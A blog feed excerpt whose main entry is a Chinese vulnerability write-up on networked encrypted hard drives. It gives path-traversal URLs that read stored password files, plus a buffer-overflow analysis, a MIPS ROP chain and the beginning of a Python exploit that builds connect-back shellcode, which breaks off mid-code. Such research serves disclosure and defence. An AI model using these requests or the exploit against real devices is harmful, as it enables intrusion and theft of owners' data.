    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Defcon" scheme="http://yaseng.org/tags/Defcon/"/>
    
      <category term="长沙线下沙龙" scheme="http://yaseng.org/tags/%E9%95%BF%E6%B2%99%E7%BA%BF%E4%B8%8B%E6%B2%99%E9%BE%99/"/>
    
      <category term="黑客沙龙" scheme="http://yaseng.org/tags/%E9%BB%91%E5%AE%A2%E6%B2%99%E9%BE%99/"/>
    
      <category term="技术沙龙" scheme="http://yaseng.org/tags/%E6%8A%80%E6%9C%AF%E6%B2%99%E9%BE%99/"/>
    
  </entry>
  
  <entry>
    <title>破解 aes 256 硬件加密固态硬盘 (补天大赛)</title>
    <link href="http://yaseng.org/cracking_hardware_aes256_encrypted_pssd_in_butian_2020.html"/>
    <id>http://yaseng.org/cracking_hardware_aes256_encrypted_pssd_in_butian_2020.html</id>
    <published>2020-11-11T16:00:00.000Z</published>
    <updated>2020-11-18T03:17:55.698Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/3711605668228_.pic_hd.jpg" alt="img"></p><h2 id="到达赛场"><a href="#到达赛场" class="headerlink" title="到达赛场"></a>到达赛场</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/3701605668109_.pic_hd.jpg" alt="img"></p><h2 id="破解成功"><a href="#破解成功" class="headerlink" title="破解成功"></a>破解成功</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/3681605668105_.pic_hd.jpg" alt="img"></p><h2 id="获奖"><a href="#获奖" class="headerlink" title="获奖 -_-"></a>获奖 -_-</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/3691605668107_.pic_hd.jpg" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/3711605668228_.pic_hd.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;到达赛场&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动硬盘破解" scheme="http://yaseng.org/tags/%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="智能硬盘破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="固态加密硬盘破解" scheme="http://yaseng.org/tags/%E5%9B%BA%E6%80%81%E5%8A%A0%E5%AF%86%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="破解大赛" scheme="http://yaseng.org/tags/%E7%A0%B4%E8%A7%A3%E5%A4%A7%E8%B5%9B/"/>
    
      <category term="补天大赛" scheme="http://yaseng.org/tags/%E8%A1%A5%E5%A4%A9%E5%A4%A7%E8%B5%9B/"/>
    
      <category term="极客大赛" scheme="http://yaseng.org/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B/"/>
    
      <category term="黑客大赛" scheme="http://yaseng.org/tags/%E9%BB%91%E5%AE%A2%E5%A4%A7%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>《物联网安全百科》 正式版 1.0 发布</title>
    <link href="http://yaseng.org/iot-security-wiki-1.html"/>
    <id>http://yaseng.org/iot-security-wiki-1.html</id>
    <published>2020-11-10T16:00:00.000Z</published>
    <updated>2021-02-04T11:46:26.154Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动硬盘破解" scheme="http://yaseng.org/tags/%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="智能硬盘破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="固态加密硬盘破解" scheme="http://yaseng.org/tags/%E5%9B%BA%E6%80%81%E5%8A%A0%E5%AF%86%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="u 盘破解" scheme="http://yaseng.org/tags/u-%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="录音笔破解" scheme="http://yaseng.org/tags/%E5%BD%95%E9%9F%B3%E7%AC%94%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>加密设备攻防(二）- 智能设备篇</title>
    <link href="http://yaseng.org/encryption-hardware-attack-and-defense-2.html"/>
    <id>http://yaseng.org/encryption-hardware-attack-and-defense-2.html</id>
    <published>2020-11-10T16:00:00.000Z</published>
    <updated>2020-12-24T07:43:07.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>智能设备的加密安全篇</p><h2 id="某家存储网络硬盘的漏洞"><a href="#某家存储网络硬盘的漏洞" class="headerlink" title="某家存储网络硬盘的漏洞"></a>某家存储网络硬盘的漏洞</h2><p>这是一款带网口的家庭存储硬盘，可以通过手机 app 进行远程管理。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112151719742.png" alt="image-20201112151719742"></p><h3 id="设备与客户端通信"><a href="#设备与客户端通信" class="headerlink" title="设备与客户端通信"></a>设备与客户端通信</h3><p>这款硬盘使用 TUTK IOTC 平台进行 p2p 通信。接上网线后，只需要在客户端输入设备的 UID 和管理员设置的密码，就可以远程连接管理硬盘数据。TUTK IOTC平台的 p2p 建立连接后，设备向客户端发送数据的流程图如下，首先初始化 iotc 平台，随后创建 login 线程，监听客户端的连接，会话建立后，向客户端发送数据。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112151918224.png" alt="image-20201112151918224"></p><p>而作为设备与客户端通信的进程为 p2pIotc，拖到 ida 中分析，sub_402E64 函数通过读取 /etc/config/tunnelid.dat 文件来得到设备的 UID，在函数 sub_402AF8 读取 /etc/web_pwd.txt 文件得到管理密码，用来用户登入验证。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112155309242.png" alt="image-20201112155309242"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173527302.png" alt="image-20201112173527302"></p><h3 id="隐私空间漏洞"><a href="#隐私空间漏洞" class="headerlink" title="隐私空间漏洞"></a>隐私空间漏洞</h3><p>这款硬盘还设立了隐私空间，也就是加密文件夹，加密文件后将文件移动到加密目录下。当通过app客户端成功登录硬盘时，首先 fs_httpd 进程会读取配置文件“/etc/private_dir_pwd“中的保存隐私空间的密码，用于之后打开隐私空间作密码校验。但是通过在web客户端或网络文件夹登录时访问这个隐私空间时，却形同虚设，与普通文件夹无区别。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173615563.png" alt="image-20201112173615563"></p><h3 id="getFile-cgi-任意文件下载"><a href="#getFile-cgi-任意文件下载" class="headerlink" title="getFile.cgi 任意文件下载"></a>getFile.cgi 任意文件下载</h3><p>   在 /www/cgi-bin/get/ 目录下，其中有个 getFile.cgi 的 cgi 网关接口文件，在没有登入验证的情况下，内网中可直接下载硬盘的任意文件，代码如下</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173625634.png" alt="image-20201112173625634"></p><p>在同内网中，在web浏览器中访问设备：</p><p><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/config/tunnelid.dat" target="_blank" rel="noopener">http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/config/tunnelid.dat</a></p><p><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">http://192.168.8.177/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">-bin/get/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">getFile.cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">?/../../../../../../../../../</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">etc</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">web_pwd.txt</a></p><p><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">http://192.168.8.177/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">-bin/get/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">getFile.cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">?/../../../../../../../../../</a>etc/private_dir_pwd</p><p>可直接下载配置文件 tunnelid.dat 、web_pwd.txt 和 private_dir_pwd ，用于远程登入。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173722295.png" alt="image-20201112173722295"></p><h2 id="某智能加密硬盘的漏洞"><a href="#某智能加密硬盘的漏洞" class="headerlink" title="某智能加密硬盘的漏洞"></a>某智能加密硬盘的漏洞</h2><p>这是一款可连接 wifi 且带网口的移动加密硬盘，手机可以通过 app 进行远程管理，还可以通过 app 单独设置密码加密隐私文件。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112194124466.png" alt="image-20201112194124466"></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201116141348745.png" alt="image-20201116141348745"></p><h3 id="第一步：硬盘的工作原理"><a href="#第一步：硬盘的工作原理" class="headerlink" title="第一步：硬盘的工作原理"></a>第一步：硬盘的工作原理</h3><p> 下载智能硬盘手机 app，登录 app 远程连接硬盘，通过路由器进行抓包，发现其由 80 端口与手机 app 通信。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113131858732.png" alt="image-20201113131858732"></p><p>通过串口调试进入 shell，运行 netstat 命令查看系统端口进程，其中 80 端口进程为 lighttpd。分析后找到其位于/etc/lighttpd/ 目录下的配置文件 lighttpd.conf，如图 3 可以看到其中 include 包含了当前 conf.d/ 目录下的 proxy.conf 文件。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113131941484.png" alt="image-20201113131941484"></p><p>将 proxy.conf 文件的代理服务整理如下：</p><table><thead><tr><th><strong>url</strong></th><th><strong>port</strong></th><th><strong>进程</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>protocol.csp</td><td>81</td><td>ioos</td><td>App  交互</td></tr><tr><td>system.csp</td><td>81</td><td>ioos</td><td>系统</td></tr><tr><td>netip.csp</td><td>81</td><td>ioos</td><td></td></tr><tr><td>sysfirm.csp</td><td>81</td><td>ioos</td><td></td></tr><tr><td>index.csp</td><td>81</td><td>ioos</td><td></td></tr><tr><td>dldlink.csp</td><td>81</td><td>ioos</td><td></td></tr><tr><td>error.csp</td><td>81</td><td>ioos</td><td></td></tr><tr><td>upload.csp</td><td>9082</td><td></td><td>上传</td></tr><tr><td>dlna.csp</td><td>8200</td><td>minidlna</td><td>DLNA共享</td></tr><tr><td>control.csp</td><td>8201</td><td>control</td><td>视频音频控制</td></tr><tr><td>dropbox.csp</td><td>8300</td><td></td><td>dropbox云存储</td></tr><tr><td>baidupcs.csp</td><td>8400</td><td>baidupcs</td><td>百度网盘</td></tr><tr><td>p2p.csp</td><td>8212</td><td></td><td>p2p远程通信</td></tr><tr><td>download.csp</td><td>82</td><td></td><td>下载</td></tr><tr><td>vpn.csp</td><td>8500</td><td></td><td>vpn</td></tr></tbody></table><h3 id="第二步：漏洞挖掘"><a href="#第二步：漏洞挖掘" class="headerlink" title="第二步：漏洞挖掘"></a>第二步：漏洞挖掘</h3><p>将 baidupcs（百度网盘）作为测试目标，使用fuzz测试登录网盘发现了 crash。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113132045448.png" alt="image-20201113132045448"></p><p>baidupcs 进程打印出如下信息，最终出现了 Segmentation fault 错误</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113132134803.png" alt="image-20201113132134803"></p><p>​    </p><h4 id="定位溢出代码"><a href="#定位溢出代码" class="headerlink" title="定位溢出代码"></a>定位溢出代码</h4><p>打开 ida，搜索上面打印的调试信息的关键字，如 getvaluefrom_url。</p><p>关键代码 sub_43B230 如下，0x43b5dc 处调用 get_value_from_url 函数获取 username 的值时，由于缓冲区只有 1028 字节， 在对长度未进行检查的情况下，将获取username值直接放入缓存区造成溢出。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113132147198.png" alt="image-20201113132147198"></p><h3 id="第三步：漏洞利用"><a href="#第三步：漏洞利用" class="headerlink" title="第三步：漏洞利用"></a>第三步：漏洞利用</h3><p>我们需要跳转到堆栈中执行 shellcode，结合 mipsrop ida 插件，现在开始构造 rop</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113133935336.png" alt="image-20201113133935336"></p><p><strong>先修改寄存器的值</strong></p><p>mipsrop.find(“lw $ra, “) 修改寄存器</p><p>​                               </p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134106752.png" alt="image-20201113134106752"></p><p><strong>找到 sleep 函数的参数</strong></p><p>mipsrop.find(“li $a0,1”) 作为 sleep 的参数 $a0 赋值，其中 $s4 做为下一个 gadget 的地址</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134112602.png" alt="image-20201113134112602"></p><p><strong>调用 sleep 函数</strong></p><p>接着调用 sleep 函数刷新缓存，并在返回后执行下一个 gadget （$ra）。使用 mipsrop.tail()，准备跳转 $s1 为 sleep 的地址，这里填充 ra 寄存器，地址 0x1E8AC 执行 0x28 + var_4($sp) 是将执行后 sleep 返回的地址。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134118925.png" alt="image-20201113134118925"></p><p><strong>运行 shellcode</strong></p><p>使用 mipsrop.stackfinder() 将 shellcode 的地址放入寄存器 s0</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134123337.png" alt="image-20201113134123337"></p><p>mipsrop.find(“move $t9,$s0”) 跳转到 s0 去执行</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134128377.png" alt="image-20201113134128377"></p><h4 id="创建exploit"><a href="#创建exploit" class="headerlink" title="创建exploit"></a>创建exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> urllib, urllib2, httplib</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MIPSPayload</span>:</span></span><br><span class="line">    BADBYTES = [<span class="number">0x00</span>]</span><br><span class="line">    LITTLE = <span class="string">"little"</span></span><br><span class="line">    BIG = <span class="string">"big"</span></span><br><span class="line">    FILLER = <span class="string">"A"</span></span><br><span class="line">    BYTES = <span class="number">4</span></span><br><span class="line">    NOP = <span class="string">"\x27\xE0\xFF\xFF"</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, libase=<span class="number">0</span>, endianess=LITTLE, badbytes=BADBYTES)</span>:</span></span><br><span class="line">        self.libase = libase</span><br><span class="line">        self.shellcode = <span class="string">""</span></span><br><span class="line">        self.endianess = endianess</span><br><span class="line">        self.badbytes = badbytes</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self.shellcode += data</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Address</span><span class="params">(self, offset, base=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            base = self.libase</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> self.ToString(base + offset)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddAddress</span><span class="params">(self, offset, base=None)</span>:</span></span><br><span class="line">        self.Add(self.Address(offset, base))</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddBuffer</span><span class="params">(self, size, byte=FILLER)</span>:</span></span><br><span class="line">        self.Add(byte * size)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddNops</span><span class="params">(self, size)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.endianess == self.LITTLE:</span><br><span class="line">            self.Add(self.NOP[::<span class="number">-1</span>] * size)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.Add(self.NOP * size)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ToString</span><span class="params">(self, value, size=BYTES)</span>:</span></span><br><span class="line">        data = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size):</span><br><span class="line">            data += chr((value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self.endianess != self.LITTLE:</span><br><span class="line">            data = data[::<span class="number">-1</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Build</span><span class="params">(self)</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.shellcode:</span><br><span class="line">            <span class="keyword">for</span> byte <span class="keyword">in</span> self.badbytes:</span><br><span class="line">                <span class="keyword">if</span> c == chr(byte):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">"Bad byte found in shellcode at offset %d: 0x%.2X"</span> % (count, byte))</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> self.shellcode</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(self, bpl=BYTES)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.shellcode:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">            sys.stdout.write(<span class="string">"\\x%.2X"</span> % ord(c))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> bpl &gt; <span class="number">0</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP</span>:</span></span><br><span class="line"> </span><br><span class="line">    HTTP = <span class="string">"http"</span></span><br><span class="line">    HTTPS = <span class="string">"https"</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, proto=HTTP, verbose=False)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.verbose = verbose</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encode</span><span class="params">(self, string)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.quote_plus(string)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Send</span><span class="params">(self, uri, headers=&#123;&#125;, data=None, response=False)</span>:</span></span><br><span class="line">        html = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> uri.startswith(<span class="string">'/'</span>):</span><br><span class="line">            c = <span class="string">''</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c = <span class="string">'/'</span></span><br><span class="line"> </span><br><span class="line">        url = <span class="string">'%s://%s%s%s'</span> % (self.proto, self.host, c, uri)</span><br><span class="line">        <span class="keyword">if</span> self.verbose:</span><br><span class="line">            <span class="keyword">print</span> url</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            data = urllib.urlencode(data)</span><br><span class="line"> </span><br><span class="line">        url = url + data</span><br><span class="line">        req = urllib2.Request(url, data, headers)</span><br><span class="line">        <span class="comment"># print url</span></span><br><span class="line">        rsp = urllib2.urlopen(req)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            html = rsp.read()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makepayload</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] prepare shellcode'</span>,</span><br><span class="line">    hosts = struct.unpack(<span class="string">'&lt;cccc'</span>,struct.pack(<span class="string">'&lt;L'</span>,host))</span><br><span class="line">    ports = struct.unpack(<span class="string">'&lt;cccc'</span>,struct.pack(<span class="string">'&lt;L'</span>,port))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#print hosts,ports</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_socket</span></span><br><span class="line">    <span class="comment"># a0: domain</span></span><br><span class="line">    <span class="comment"># a1: type</span></span><br><span class="line">    <span class="comment"># a2: protocol</span></span><br><span class="line">    mipselshell =<span class="string">"\xfa\xff\x0f\x24"</span>   <span class="comment"># li t7,-6</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x78\xe0\x01"</span>   <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\xe4\x21"</span>   <span class="comment"># addi a0,t7,-3</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\xe5\x21"</span>   <span class="comment"># addi a1,t7,-3</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x06\x28"</span>   <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\x57\x10\x02\x24"</span>   <span class="comment"># li v0,4183 # sys_socket</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">    